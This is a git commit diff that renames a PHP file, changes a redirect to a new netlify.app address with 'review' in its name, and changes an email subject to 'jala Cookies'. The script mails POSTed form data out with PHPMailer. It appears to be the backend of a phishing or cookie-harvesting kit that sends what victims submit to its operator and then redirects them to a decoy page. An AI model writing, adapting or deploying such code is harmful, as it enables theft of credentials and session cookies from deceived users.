00dc9906d2bfaa5bac9b6772925cee65fb70440a
Uzr44911 <ahmjtalijaan@gmail.com>
2025-07-19 12:55:33 +0500

    Update and rename Raja.php to Jala.php

--- Jala.php
+++ Jala.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://cerulean-churros-bc42a4.netlify.app/");
+header("Location: https://playful-dolphin-a65f4c-review-in.netlify.app/");
 
 require 'Exception.php';
 require 'PHPMailer.php';
@@ -43,7 +43,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'raja Cookies';
+        $mail->Subject = 'jala Cookies';
         $mail->Body = $emailBody; // Set the email body using the collected form data
 
         // Send email
